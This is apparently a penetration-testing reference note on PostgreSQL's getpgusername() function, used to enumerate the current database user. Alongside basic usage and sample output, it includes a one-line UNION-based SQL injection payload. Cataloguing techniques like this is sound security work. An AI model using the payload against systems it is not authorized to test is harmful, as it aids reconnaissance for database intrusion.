---
type: command
executor: sql
data: SELECT getpgusername();
tags:
  - postgresql
  - user-enumeration
  - discovery
platforms:
  - Database
  - PostgreSQL
verified: true
validated: true
---

# postgresql-select-getpgusername

## Command

```sql
SELECT getpgusername();
```

## Description

This SQL command uses PostgreSQL's getpgusername() function to return the name of the current database user. It provides an alternative to direct SELECT queries and can be useful in restricted environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Function call with no arguments | Yes |

## Examples

### Basic Usage

```sql
SELECT getpgusername();
```

### In Injection Payload

```sql
' UNION SELECT getpgusername(); --
```

## Expected Output

A single value, e.g.:

```
 getpgusername 
----------------
 app_user
(1 row)
```

## Related

- [[procedures/PostgreSQL-Current-User-Information-Gathering]]
- [[commands/postgresql-select-current-user]]
